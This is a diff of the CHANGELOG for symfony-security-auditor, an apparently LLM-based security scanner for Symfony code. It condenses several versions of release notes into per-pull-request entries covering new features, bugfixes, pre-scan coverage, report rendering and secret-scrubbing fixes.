+- SARIF output marks baselined findings as suppressed instead of dropping them ([#123](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/123))
+- The auditor runs as a standalone native executable configured once at the user level, with a PowerShell installer (`install.ps1`) beside the POSIX one ([#91](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/91))
+- `bin/console audit` is a shorthand for `audit:run` in the bundle ([#91](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/91))
+- LLM pricing comes from the daily `symfony/models-dev` catalog instead of a hand-maintained price table; `audit:run` warns up front about an unpriced model and refuses a budgeted run whose cost it cannot enforce ([#89](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/89))
+- Prompt-cache traffic is priced from each provider's real per-model cache rates instead of Anthropic-only multipliers ([#89](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/89))
+- The reviewer phase streams a live verdict line per finding, ending the apparent freeze during long reviews ([#78](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/78))
+- Symlinked files are no longer followed into the LLM prompt by the project scan ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
 
-- **New attack surfaces are now first-class**, each with a dedicated pre-scan
-  bucket, chunking slot, and attacker-skill block: file uploads, Twig
-  extensions, API Platform `#[ApiResource]` resources, and Symfony UX Live
-  Components.
-- **Findings now carry a CWE reference** alongside the existing OWASP Top 10
-  mapping, surfaced in every renderer and tagged in SARIF
-  (`external/cwe/cwe-*`).
-- **New `audit:diff` command** compares two JSON reports and reports new, fixed,
-  and persisting findings by fingerprint.
-- **Each finding in JSON output now carries its stable `fingerprint`** — the
-  same `SSA-`-prefixed hash that backs baselines and SARIF `partialFingerprints`
-  — so reports can be diffed and findings tracked across runs.
-- **New output formats**: `--format junit` (JUnit XML for CI test panels) and
-  `--format github` (GitHub Actions annotations shown inline on a PR's Files
-  Changed view).
-- **New `--show-scanned` option** lists the exact files an audit would ingest
-  without invoking the LLM.
-- **`security.yaml` is now parsed with `symfony/yaml`** instead of single-line
-  regexes, so the access-control map the attacker reasons over is complete.
-- **Committed dotenv files are now part of the default scan surface**, with
-  deterministic secret markers.
-- **Baselined findings skip the reviewer entirely**, and the baseline file is
-  human-readable.
-- **The auditor can run as a standalone executable** configured once at the user
-  level, with a Windows PowerShell installer (`install.ps1`) alongside the POSIX
-  one; `bin/console audit` is a shorthand for `audit:run` in the bundle.
-- **LLM pricing is sourced from the daily `symfony/models-dev` catalog** (via a
-  new `CacheAwarePricingProviderInterface` port) instead of a hand-maintained
-  price table; `audit:run` warns up front on an unpriced model and refuses a
-  budgeted run whose cost it cannot enforce.
-- **The reviewer phase streams a live verdict line per finding**, ending the
-  apparent freeze during long reviews.
-- **Value-object factories `Vulnerability::of()`, `SymfonyMapping::of()`, and
-  `LLMResponse::of()`** replace the wide positional `create()` signatures, plus
-  new domain exceptions `InvalidCodeLocationException` and
-  `InvalidVulnerabilityClassificationException`.
+### Deprecations 💀
 
-### Changed
+- `Vulnerability::create()`, `SymfonyMapping::create()` and `LLMResponse::create()` are deprecated, use the `of()` factories instead ([#78](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/78))
 
-- **Every raw SPL exception thrown from production code is replaced with a
-  project-defined exception** (per the Custom Exceptions rule), and every method
-  and test that can reach one declares it via `@throws`.
-- **`ProjectFile` type detection is a single source of truth**, so `fileType()`
-  and the `is*()` predicates can no longer disagree; `.xml` config and non-PHP
-  files under `/Webhook/` or `/MessageHandler/` are now classified correctly.
-- **Report rendering and prompt building are each split behind interfaces**
-  (`ReportRendererInterface`, one class per format; separate attacker/reviewer
-  prompt builders), and the structured-collection wiring shared by five
-  analyzers is extracted into one collaborator per domain.
-- **SARIF output marks baselined findings as suppressed** instead of dropping
-  them.
-- **OWASP references now point at the Top 10:2025 edition** instead of 2021.
-- **Prompt-cache traffic is priced from each provider's real per-model cache
-  rates** instead of Anthropic-only multipliers.
-- **Constructor ports that DI always resolves are now required** instead of
-  silently falling back to a `Null*` default.
+### Bugfixes 🐛
 
-### Deprecated
+- `.xml` config files and non-PHP files under `/Webhook/` or `/MessageHandler/` are classified correctly ([#121](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/121))
+- Lean mode (`fast` profile) no longer drops files holding a real sink the code slicer would keep: the pre-scanner now recognises `#[ApiResource]` and `#[AsLiveComponent]` actions reading `$request`, `#[AsEventListener]` listeners, `DenormalizerInterface` classes and dynamic `include` / `require` ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Lean mode also keeps files using the modern `$request->` accessors, `Process::fromShellCommandline()`, Twig `createTemplate()`, list-form wildcard CORS, the Messenger `native_php_serializer` transport, DBAL `fetch*` / `iterate*` one-shot queries and `DOMDocument::loadXML()` / `simplexml_load_file()` ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Pre-scan custom patterns with the DOTALL (`s`) modifier now match across lines ([#109](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/109))
+- A signature compare split across lines is flagged as non-constant-time, in either operand order ([#116](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/116))
+- Pre-scan markers match `supports()` returning `null` after an earlier guard, and dynamic `orderBy` / `redirect` / `submit` ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Pre-scan markers catch bare column-0 or tab-indented `include` / `require` / `exec` ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Route and security parsing report the truth to the attacker: `#[Route(methods: 'DELETE')]` single-string form, `#[Route(name:)]`, name-keyed `access_control` rules, invokable `#[AsController]` services and deliberately public `access_control` routes ([#104](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/104), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- `#[IsGranted]` is read with `attribute` in any argument position, and voters using `in_array($attribute, [self::EDIT])` are understood ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- The code slicer keeps multi-line method signatures and attribute argument lists, no longer desyncs on heredoc-terminated calls and retains bare `include` / `require` statements ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Report renderers no longer crash or pass attacker-influenced text through as terminal markup, ANSI, bidi or Markdown injection, across console, HTML, SARIF, JUnit, GitHub-annotation and Markdown output ([#110](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/110), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Accented text no longer corrupts at console wrap points, SARIF rules shared by several categories are named deterministically and JUnit output always re-parses ([#110](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/110), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131))
+- Findings recorded before a mid-run budget or provider abort are kept, including attacker candidates, reviewer verdicts from all five analyzers and synthesized PoCs, and the partial report still applies the finding-type filter and baseline suppression ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- A `record_vulnerability` call without `confidence` is dropped instead of skipping the confidence floor, and a dropped finding is logged ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- LLM retry follows the provider: a `Retry-After` HTTP date is honored, jitter cannot undercut the requested wait, a 529 overloaded response is transient, a misconfigured `retry.max_attempts` cannot wedge the run and a hostile `Retry-After` cannot bypass the safety ceiling ([#115](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/115), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Concurrent LLM calls no longer corrupt the rate limiter's token accounting ([#113](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/113))
+- Concurrent tool-using conversations retry a transient failure that happens after a tool already ran, instead of abandoning the conversation as empty ([#120](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/120))
+- Cache keys invalidate correctly: the attacker cache key folds in code slicing, static pre-scan and tool toggles, and an escalation run no longer poisons the primary attacker's cache ([#114](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/114), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- The reviewer verdict cache keys on the structured-collection mode, and the advisory cache honors its TTL and `cache.enabled` ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- `audit.budget.max_cost_usd` is validated at boot, `--since` resolves paths in a monorepo subdirectory and no longer drops dotfiles or non-ASCII names, and machine-readable output goes to the correct stream ([#108](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/108), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- The CI-failure message reflects the actual `--fail-on` threshold ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- `audit.tools_enabled` and `audit.escalation.enabled` behave as documented, and enabling escalation no longer crashes the container ([#117](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/117), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131))
+- Bedrock-qualified Claude model IDs use the right token ratio, the `--dry-run` estimate sums per-file token counts, and non-transient status codes embedded as digit substrings are no longer misclassified as fatal ([#111](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/111), [#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- A reviewer-cache lookup no longer crashes the run on non-UTF-8 bytes in a finding, the standalone binary emits a clean CLI error when `HOME` and the XDG variables are absent, a stray non-object JSON payload in a batched reviewer response is rejected per finding, and `composer audit` targets the audited project ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- Three `VulnerabilityType` CWE and OWASP mappings are corrected against MITRE CWE 4.20 and OWASP Top 10:2025 ([#131](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/131))
 
-- **`Vulnerability::create()`, `SymfonyMapping::create()`, and
-  `LLMResponse::create()`** — use the `of()` value-object factories instead.
+### Core 🧱
 
-### Removed
-
-- **`StaticPricingProvider` and its hand-maintained 68-model `PRICES` constant**
-  (superseded by the `symfony/models-dev` catalog), and the unused
-  `AuditPresenterInterface::baselineApplied()`.
-
-### Fixed
-
-- **Lean-mode no longer drops files that hold a real sink the slicer would
-  keep.** The `fast` profile's zero-marker filter previously excluded, before
-  the slicer ran, files whose only security-relevant line was one the
-  pre-scanner failed to flag. Coverage was extended so the pre-scanner
-  recognises every such construct: `#[ApiResource]` entities with a sensitive
-  setter; `#[ApiResource]` /`#[AsLiveComponent]` classes with routed `$request`
-  actions; `#[AsEventListener]` attribute listeners; standalone
-  `DenormalizerInterface` classes; dynamic `include`/`require`; every modern
-  `$request->` accessor (`toArray`, `getPayload`, `cookies`/`files`/`headers`,
-  …); `Process::fromShellCommandline()`; Twig `->createTemplate()`; list-form
-  wildcard CORS (`allow_origin: ['*']`); the Messenger `native_php_serializer`
-  transport; DBAL `fetch*`/`iterate*` one-shot queries; and
-  `DOMDocument::loadXML()`/`simplexml_load_file()`.
-- **Pre-scan markers now match the multi-line and idiomatic forms of the
-  patterns they target**: `supports()` returning `null` after an earlier guard,
-  dynamic `orderBy`/`redirect`/`submit`, split-across-lines signature compares,
-  both operand orders of a non-constant-time compare, DOTALL (`s`) custom
-  patterns, and bare column-0/tab-indented `include`/`require`/`exec`.
-- **Route and security parsing report the truth to the attacker LLM**:
-  `#[Route(methods: 'DELETE')]`'s single-string form, `#[Route(name:)]` and
-  name-keyed `access_control` rules, invokable `#[AsController]` services,
-  `#[IsGranted]`'s `attribute`-named argument regardless of position, voters
-  using the canonical `in_array($attribute, [self::EDIT])` pattern, and
-  deliberately public `access_control` routes (recorded as public, not skipped).
-- **The code slicer preserves security-relevant lines**: multi-line method
-  signatures and attribute argument lists keep their parameters, heredoc-
-  terminated calls no longer desync continuation tracking, and bare
-  `include`/`require` statements are retained.
-- **Report renderers no longer crash or emit attacker-influenced text as live
-  terminal markup / ANSI / bidi / Markdown-injection**, across console, HTML,
-  SARIF, JUnit, GitHub-annotation, and Markdown output; accented text no longer
-  corrupts at console wrap points; SARIF rules shared by multiple categories are
-  named deterministically; JUnit output is always re-parseable.
-- **Findings produced before a mid-run budget/provider abort are preserved
-  instead of discarded** — attacker candidates, reviewer verdicts (across all
-  five analyzers, including already-applied verdicts from an earlier concurrent
-  window), and synthesized PoCs — and a budget-aborted partial report still
-  applies the finding-type filter and baseline suppression.
-- **Confidence-floor handling is correct**: a `record_vulnerability` call that
-  omits `confidence` is dropped rather than skipping the floor, and a dropped
-  finding is now logged.
-- **LLM retry/rate-limiting respects the provider**: a `Retry-After` HTTP-date
-  is honored, backoff jitter can no longer undercut the requested wait, a
-  529/overloaded response is treated as transient, a misconfigured
-  `retry.max_attempts` can no longer wedge the run, a hostile `Retry-After`
-  cannot bypass the safety ceiling, and concurrent calls no longer corrupt the
-  rate limiter's token accounting.
-- **Cache keys invalidate correctly**: the attacker cache key now folds in the
-  code-slicing, static-pre-scan, and tool toggles; the reviewer verdict cache
-  keys on the structured-collection mode; the advisory cache honors its TTL and
-  `cache.enabled`; and an escalation run no longer poisons the primary
-  attacker's cache.
-- **Command, config, and budget edges are handled up front**:
-  `audit.budget.max_cost_usd` is validated at boot; `--since` resolves paths in
-  a monorepo subdirectory and no longer drops dotfiles or non-ASCII names;
-  machine-readable output goes to the correct stream; the CI-failure message
-  reflects the actual `--fail-on` threshold; and `audit.tools_enabled` /
-  `audit.escalation.enabled` behave as documented.
-- **Token/cost estimation is accurate**: Bedrock-qualified Claude model IDs use
-  the right ratio, the `--dry-run` estimate sums per-file token counts, and
-  non-transient status codes embedded as digit substrings are no longer
-  misclassified as fatal.
-- **Robustness**: a reviewer-cache lookup no longer crashes the whole run on
-  non-UTF-8 bytes in a finding, the standalone binary emits a clean CLI error
-  when `HOME`/XDG vars are absent, a stray non-object JSON payload in a batched
-  reviewer response is rejected per-finding, and `composer audit` targets the
-  audited project. Three `VulnerabilityType` CWE/OWASP mappings are corrected
-  against MITRE CWE 4.20 and OWASP Top 10:2025.
-
-### Security
-
-- **The secret scrubber no longer leaks credentials into the LLM prompt**:
-  unquoted config values, credential env vars with the keyword in the middle
-  (`DB_TOKEN_STAGING`), the `api_token` key, and the line after an empty-valued
-  credential key are all redacted correctly.
-- **`ProjectFileScanner` no longer follows symlinked files** into the LLM
-  prompt, and the install scripts fail closed on checksum verification.
-- **`AuditBudget::forCost()`/`forBoth()` reject a non-finite (`+INF`) cost cap**
-  instead of silently disabling the budget.
+- The secret scrubber no longer leaks credentials into the LLM prompt: unquoted config values, credential variables with the keyword in the middle (`DB_TOKEN_STAGING`), the `api_token` key and the line after an empty-valued credential key are all redacted ([#112](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/112), [#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- The install scripts fail closed on checksum verification ([#91](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/91))
+- `AuditBudget::forCost()` and `AuditBudget::forBoth()` reject a non-finite (`+INF`) cost cap instead of silently disabling the budget ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- `StaticPricingProvider` and its hand-maintained 68-model `PRICES` constant are removed in favor of the `symfony/models-dev` catalog, as is the unused `AuditPresenterInterface::baselineApplied()` (both `@internal`) ([#89](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/89), [#130](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/130))
+- `CacheAwarePricingProviderInterface` is a new Domain port for cache-aware pricing ([#89](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/89))
+- `Vulnerability::of()`, `SymfonyMapping::of()` and `LLMResponse::of()` replace the wide positional `create()` signatures, with new domain exceptions `InvalidCodeLocationException` and `InvalidVulnerabilityClassificationException` ([#78](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/78))
+- Every raw SPL exception thrown from production code is replaced with a project-defined exception ([#134](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/134))
+- `ProjectFile` type detection is a single source of truth, so `fileType()` and the `is*()` predicates can no longer disagree ([#121](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/121))
+- Report rendering is split into one class per format behind `ReportRendererInterface`, and prompt building into separate attacker and reviewer builders ([#100](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/100), [#107](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/107))
+- The structured-collection wiring shared by five analyzers is extracted into one collaborator per domain ([#124](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/124))
+- Constructor ports that DI always resolves are now required instead of silently falling back to a `Null*` default ([#125](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/125))
 
 ## [1.12.0] — 2026-06-16 — Spotlight
 
-An observability release. The long audit stage is no longer a black box:
-`audit:run` now streams each finding the instant the attacker records it, opens
-with an attack-surface overview, closes every iteration with a reviewer tally,
-and prints per-chunk timing — so slow local-model runs read as working, not
-frozen. A new CI-safe `PlainProgressReporter` renders the same narrative as
-clean, append-only lines for non-TTY output, and a decorated terminal gets a
-severity-colored findings feed above the bar. Reports now link back to the
-project across the HTML, Markdown, and console formats; the `--dry-run` "no
-pricing data" notice no longer reads like an error for local/self-hosted models;
-Symfony component detection recognizes controllers, voters, forms, entities, and
-repositories by directory and content, not just filename suffix; and the
-`symfony/ai-bundle` requirement moves to `^0.10`.
+### New Features ✨
 
-### Added
+- `audit:run` streams each finding the instant the attacker records it (e.g. `⚔ 🟠 HIGH sql_injection — src/Controller/UserController.php:42`), opens the audit with an attack-surface overview listing only non-empty categories, and closes each iteration with a reviewer tally (`✓ Reviewed: 5 validated, 1 rejected`) ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
+- Slow and local-model runs no longer look frozen: the progress bar reads `⏳ querying model · chunk 2/5` while a call is in flight and each chunk prints its wall time when it returns (`✓ chunk 2/5 analyzed (47s)`) ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
+- Non-interactive output (CI logs, pipes, redirected files) gets plain append-only progress lines instead of progress-bar redraws, while a decorated terminal keeps the animated bar with an elapsed-time counter and a severity-colored findings feed above it; `--format=json|sarif` on stdout stays silent ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
+- `audit:run` prints the resolved absolute project directory in its header and report (instead of `.`), and the long-run heads-up is now a dim one-line message instead of a boxed `[NOTE]` ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
+- Reports link back to the project: the HTML footer is now a hyperlink, the Markdown report gains a `Generated by` footer and the console header prints the project URL (JSON and SARIF are unchanged) ([#73](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/73))
+- The `--dry-run` "no pricing data" notice states that `$0.00` is correct for a local or self-hosted model (Ollama, LM Studio) and only flags a typo or an unlisted model as the problem case ([#72](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/72))
 
-- **Live findings feed and a CI-safe progress renderer for `audit:run`.** Early
-  users praised the accuracy and remediation quality but reported having "no
-  visibility into what the audit is doing" during the long audit stage — the run
-  streamed nothing as findings were discovered, and in CI the animated progress
-  bar was the wrong tool entirely. The console now narrates the audit as it
-  happens: each vulnerability the attacker flags streams out the instant it is
-  recorded (e.g.
-  `⚔ 🟠 HIGH sql_injection — src/Controller/UserController.php:42`), the audit
-  opens with an attack-surface overview that lists only non-empty categories
-  (`🔍 Auditing 152 file(s) — 24 controller(s), 5 voter(s), 8 form(s)`), and
-  each iteration closes with a reviewer tally
-  (`✓ Reviewed: 5 validated, 1 rejected`). Three new wire-format progress events
-  back this — `audit.started` and `review.completed` (emitted by
-  `AuditOrchestrator`, `src/Audit/Application/Agent/AuditOrchestrator.php`) and
-  `attacker.finding.recorded` (emitted per finding by the sequential and
-  concurrent chunk analyzers via `ChunkFindingProgress`,
-  `src/Audit/Application/Agent/Chunk/ChunkFindingProgress.php`) — all flowing
-  through the existing `ProgressReporterInterface` port, additive to the events
-  shipped in 1.11.0. A new `PlainProgressReporter`
-  (`src/Audit/Infrastructure/Progress/PlainProgressReporter.php`) renders the
-  same narrative as plain, append-only lines — no carriage returns, no cursor
-  control, no progress bar — for non-interactive output (CI logs, pipes,
-  redirected files), keeping the feed clean and greppable and the log alive on
-  long runs. `audit:run` selects the renderer automatically from
-  `OutputInterface::isDecorated()`: the animated `ConsoleProgressReporter` for a
-  TTY, `PlainProgressReporter` otherwise. Machine-readable stdout
-  (`--format=json|sarif` without `--output`) stays silent as before. Progress
-  reporting adds no measurable runtime cost — events are O(findings)/O(chunks)
-  and rendering is local I/O, dwarfed by the LLM calls.
-- **Slow and local-model runs no longer look frozen mid-chunk.** A synchronous
-  LLM call blocks for its whole duration — minutes at a time on a local model —
-  with no chance to repaint, so the line appeared hung. The bar message now
-  reads `⏳ querying model · chunk 2/5` while a call is in flight (so the pause
-  reads as waiting, not a crash), and each chunk prints a completion line with
-  its wall time as it returns (`✓ chunk 2/5 analyzed (47s)`). In a decorated
-  terminal the findings feed is now color-coded by severity (red critical,
-  bright-red high, yellow medium, green low, blue info — via the new
-  `SeverityColor` map), the overview is cyan and the review/chunk lines green;
-  these are stripped automatically in non-interactive output. This makes
-  progress and per-chunk timing visible between calls. Backed by a new
-  `attacker.chunk.completed` wire event (chunk index, total, elapsed seconds)
-  emitted by the sequential and concurrent chunk analyzers and rendered by both
-  `ConsoleProgressReporter` and `PlainProgressReporter`. (A true mid-call
-  animation would require streaming the model response — a larger change to the
-  LLM seam — because the global audit total, iterations × chunks, is not known
-  ahead of time.)
+### Bugfixes 🐛
 
-### Changed
+- Symfony component detection: controllers, voters, forms, entities and repositories are now recognized by directory (`/Controller/`, `/Voter/`, `/Repository/`, `/Entity/`, `/Entities/`, `/Form/` with a `Type.php` suffix) and by content, not only by filename suffix, so invokable-style controllers get route, access-control and form analysis and are counted in the overview ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
+- Concurrent tool-using conversations: a timeout or `5xx` that happens after a tool already ran is now retried like every other call instead of discarding the conversation as empty ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
 
-- **The `--dry-run` "no pricing data" warning no longer reads like an error for
-  local models.** When a configured model is absent from the bundled
-  `StaticPricingProvider` price table,
-  `AuditPresenter::unsupportedModelWarnings()`
-  (`src/Command/AuditPresenter.php`) prints a stderr notice and the estimate
-  shows `$0.00`. The previous copy — _"No pricing data for the configured
-  model(s): … and may be inaccurate. Check the model name(s) …"_ — framed the
-  legitimate local/self-hosted case (Ollama, LM Studio), where `$0.00` is the
-  correct estimate, as a likely misconfiguration. The notice now states that
-  `$0.00` is correct for a local or self-hosted model and can be ignored, and
-  only flags a typo or an unlisted model as the problem case. Unchanged: the
-  notice stays stderr-only (so `--format=json` / `--format=sarif` stdout is
-  untouched) and token counts remain accurate.
-- **Report attribution now links back to the project across the HTML, Markdown,
-  and console formats.** The HTML footer in
-  `src/Audit/Infrastructure/Report/Template/report.html` previously rendered
-  `Generated by vinceamstoutz/symfony-security-auditor.` as plain text; it is
-  now a hyperlink to
-  <https://github.com/vinceamstoutz/symfony-security-auditor>. The Markdown
-  report (`ReportRenderer::renderMarkdown()`) gained a
-  `Generated by [vinceamstoutz/symfony-security-auditor](…)` footer, and the
-  console header (`src/Audit/Infrastructure/Report/Template/console.txt`) now
-  prints the project URL beneath the package name. SARIF already exposed the URL
-  as the tool driver's `informationUri`; it is now sourced from the shared
-  `ReportRenderer::HOMEPAGE_URL` constant (value unchanged), and the JSON report
-  is untouched.
+### Core 🧱
 
-- **The console progress bar no longer renders in non-interactive output.**
-  `audit:run` previously drove a Symfony `ProgressBar` regardless of whether the
-  output was a terminal, so CI logs and redirected files accumulated bar redraws
-  that read as noise. Non-decorated runs now use the new `PlainProgressReporter`
-  (one clean line per event); decorated terminals keep the animated bar — now
-  with an elapsed-time counter and the live findings feed printed above it. The
-  human-readable console output is not part of the BC promise (see
-  `docs/versioning.md`); the JSON, SARIF, HTML, and Markdown reports are
-  unchanged.
-- **`audit:run` prints the resolved project directory and a lighter heads-up.**
-  The header and report showed the path exactly as given — `.` when run from the
-  project root — which read poorly; `AuditCommandInput::resolvedProjectPath()`
-  now resolves `.` and relative paths to an absolute directory (via
-  `Path::makeAbsolute`, trimming surrounding whitespace). The long-run heads-up
-  is now a dim one-line message instead of a boxed `[NOTE]` block.
-- **Minimum `symfony/ai-bundle` requirement raised from `^0.9` to `^0.10`.**
-  `composer.json` now requires `symfony/ai-bundle: ^0.10`. `symfony/ai-platform`
-  0.10 widened `PlatformInterface::invoke()`'s first parameter from
-  `string $model` to `Model|string $model`; the bundle's production code is
-  unaffected (it calls `invoke()` with a string, still valid under the widened
-  signature), so existing runs behave identically. Consumers pinning
-  `symfony/ai-bundle: ^0.9` must allow `^0.10` to upgrade.
-
-### Fixed
-
-- **Symfony component detection now recognizes controllers, voters, forms,
-  entities, and repositories by directory and content — not just by filename
-  suffix.** `ProjectFile` (`src/Audit/Domain/Model/ProjectFile.php`) classified
-  a controller only when its path ended in `Controller.php`, so a project of
-  invokable/action-style controllers under `src/Controller/` (e.g.
-  `src/Controller/Homepage.php`) reported a single controller in the audit
-  overview — and, worse, only that one received controller-aware analysis:
-  `MappingStage` parses route/access-control and form bindings exclusively from
-  recognized controllers, and the feature chunker groups context around them.
-  Detection now also matches the canonical directories (`/Controller/`,
-  `/Voter/`, `/Repository/`, `/Entity/`, `/Entities/`, and `/Form/` with a
-  `Type.php` suffix) and telltale content (`extends AbstractController` or
-  `#[Route]`; `implements VoterInterface` or `extends Voter`;
-  `extends AbstractType`; `#[ORM\Entity]`; `extends ServiceEntityRepository` or
-  `EntityRepository`) — for both the `is*()` predicates and the
-  `ProjectFileType` classification, so the mapping counts, feature chunking, and
-  route/form analysis all see the full set. Plain `.php` services without these
-  signals stay classified as services.
-- **Concurrent tool-using conversations no longer abandon themselves on a
-  transient failure that happens after a tool already ran.**
-  `ToolConversationWavefront::advanceConversation()`
-  (`src/Audit/Infrastructure/LLM/ToolConversationWavefront.php`) caught every
-  dispatch or resolution failure in a bare `catch (Throwable)` and, once
-  `runToolCalls()` had executed a tool, finalized the conversation as an empty
-  `empty_content` response with no retry at all — a single timeout or `5xx`
-  right after a tool call threw the conversation away, even though every other
-  call path classifies and retries the same failure class via
-  `RetryingPlatformInvoker` (`SymfonyAiLLMClient::complete()` and
-  `SequentialToolLoop::run()` both go through it). A conversation that fails
-  after a tool ran now retries the same conversation through
-  `RetryingPlatformInvoker::invoke()` — the same classify-then-retry-or-fail
-  seam the sequential path already uses — via a new
-  `ToolConversationWavefront::retryOrAbortConversation()`, and only finalizes as
-  `empty_content` once that retry is exhausted or the failure is non-transient.
-  A dispatch failure before any tool has run now goes through the same
-  classified retry first too, falling back to the full `completeWithTools()`
-  restart only once that retry itself fails, instead of always paying for a full
-  restart on the very first failure. `BudgetExceededException` is unaffected: it
-  still propagates immediately and is never retried, on any path. Also extracted
-  the duplicated `empty_content` `LLMResponse` construction from
-  `SymfonyAiLLMClient::complete()` and `SequentialToolLoop::run()` into a shared
-  `EmptyLLMResponseFactory`
-  (`src/Audit/Infrastructure/LLM/EmptyLLMResponseFactory.php`).
+- The minimum `symfony/ai-bundle` requirement moves from `^0.9` to `^0.10`; projects pinning `^0.9` must allow `^0.10` to upgrade ([#71](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/71))
+- The progress reporter port gains the `audit.started`, `review.completed`, `attacker.finding.recorded` and `attacker.chunk.completed` events, additive to the ones shipped in 1.11.0 ([#70](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/70))
 
 ## [1.11.0] — 2026-06-15 — Tracer
 
-A gating, suppression, reporting, and detection release. Audits can now fail CI
-at a chosen severity (`audit.fail_on` / `--fail-on`, default `critical`) and
-mute whole finding classes without per-finding baselines (`audit.excluded_types`
-/ `audit.included_types`). SARIF output gained stable `partialFingerprints` so
-GitHub Code Scanning tracks findings across runs, plus per-rule OWASP `helpUri`s
-(with `authenticator_bypass` and `missing_signature_verification` re-mapped to
-A07/A08), and a new `--format=markdown` renders a report for pull-request
-comments and job summaries. The attacker prompt now traces each finding
-source→sink, sweeps the STRIDE categories per entry point, and weights severity
-by exposure.
+### New Features ✨
 
-### Added
+- `audit.fail_on` and `audit:run --fail-on=<level>` (`safe`, `low`, `medium`, `high` or `critical`) set the risk level at which the run exits `1`, so a pull request can fail on HIGH, MEDIUM or LOW findings; the default stays `critical`, so existing exit codes are unchanged, and it is planned to become `high` in the next major (pin it explicitly to be immune) ([#65](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/65))
+- `audit.excluded_types` drops findings of the listed vulnerability types from the report, the exit code and any generated baseline, and `audit.included_types` is an allowlist that keeps only the listed types (exclusions win); both default to `[]` and are validated against the vulnerability types ([#65](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/65))
+- SARIF results carry a stable `partialFingerprints` value (`symfonySecurityAuditor/v1`, the same fingerprint baselines use) so GitHub Code Scanning tracks findings across runs, and each rule's `helpUri` points to its own OWASP Top 10 2021 category page ([#66](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/66))
